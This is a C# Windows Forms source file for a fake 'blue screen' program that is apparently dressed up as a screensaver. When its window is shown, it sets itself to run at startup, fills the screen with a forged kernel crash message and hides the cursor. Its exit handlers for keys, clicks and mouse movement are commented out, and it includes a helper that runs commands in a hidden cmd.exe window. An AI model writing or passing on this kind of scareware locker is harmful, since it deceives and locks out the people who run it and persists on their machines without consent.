using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace Blue_Screen
{
    public partial class Form1 : Form
    {
        bool IsPreviewMode = false;

        #region Preview API's

        [DllImport("user32.dll")]
        static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, IntPtr dwNewLong);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        static extern bool GetClientRect(IntPtr hWnd, out Rectangle lpRect);

        #endregion

        #region Constructors

        public Form1()
        {
            InitializeComponent();
        }

        public Form1(Rectangle Bounds)
        {
            InitializeComponent();
            this.Bounds = Bounds;
            Cursor.Hide();
        }

        public Form1(IntPtr PreviewHandle)
        {
            InitializeComponent();
            SetParent(this.Handle, PreviewHandle);
            SetWindowLong(this.Handle, -16, new IntPtr(GetWindowLong(this.Handle, -16) | 0x40000000));
            Rectangle ParentRect;
            GetClientRect(PreviewHandle, out ParentRect);
            this.Size = ParentRect.Size;
            this.Location = new Point(0, 0);
            IsPreviewMode = true;
        }

        #endregion

        #region GUI

        private void MainForm_Shown(object sender, EventArgs e)
        {
            NativeMethods.SetAutorunValue(true);
            Rectangle scrsize = Screen.PrimaryScreen.Bounds;
            this.Width = scrsize.Width;
            this.Height = scrsize.Height;
            this.WindowState = FormWindowState.Maximized;
            Cursor.Hide();
            if (!IsPreviewMode)
            {
                this.Refresh();
                System.Threading.Thread.Sleep(1000);
            }
            this.BackColor = Color.FromArgb(0, 0, 130);
            this.BackgroundImage = GenerateBSOD();
        }

        private Bitmap GenerateBSOD()
        {
            Bitmap BSOD = new Bitmap(640, 480);
            Graphics BSODGraphics = Graphics.FromImage(BSOD);
            BSODGraphics.FillRectangle(new SolidBrush(Color.FromArgb(0, 0, 130)), new Rectangle(0, 0, 640, 480));
            string Error = "UNEXPECTED_KERNEL_MODE_TRAP";
            string File = "user32.dll";
            string BSODText = "\r\n" + Bsod.Header + " " + File + "\r\n\r\n" + Error + "\r\n\r\n" + Bsod.Middle + File + "\n\n" + Bsod.End;
            BSODGraphics.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SingleBitPerPixelGridFit;
            BSODGraphics.DrawString(BSODText, new Font("Lucida Console", 10, FontStyle.Regular), Brushes.White, new PointF(0, 0));
            BSODGraphics.Dispose();
            Bitmap Scaled = new Bitmap(this.Width, this.Height);
            Graphics ScaledGraphics = Graphics.FromImage(Scaled);
            if (IsPreviewMode)
            {
                ScaledGraphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
            }
            else
            {
                ScaledGraphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
            }
            ScaledGraphics.DrawImage(BSOD, new Rectangle(0, 0, this.Width, this.Height));
            return Scaled;
        }

        #endregion

        #region User Input

        private void MainForm_KeyDown(object sender, KeyEventArgs e)
        {
            if (!IsPreviewMode)
            {
                // Application.Exit();
            }
        }

        private void MainForm_Click(object sender, EventArgs e)
        {
            if (!IsPreviewMode)
            {
                // Application.Exit();
            }
        }

        Point OriginalLocation = new Point(int.MaxValue, int.MaxValue);

        private void MainForm_MouseMove(object sender, MouseEventArgs e)
        {
            if (!IsPreviewMode)
            {
                if (OriginalLocation.X == int.MaxValue & OriginalLocation.Y == int.MaxValue)
                {
                    OriginalLocation = e.Location;
                }
                if (Math.Abs(e.X - OriginalLocation.X) > 20 | Math.Abs(e.Y - OriginalLocation.Y) > 20)
                {
                    // Application.Exit();
                }
            }
        }

        #endregion

        #region Useful Functions
        private void ExecCmd(string cmd)
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            process.Start();
            using (StreamWriter Writer = process.StandardInput)
            {
                Writer.WriteLine(cmd);
            }
        }
        #endregion

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            //Application.Restart();
        }
    }
}
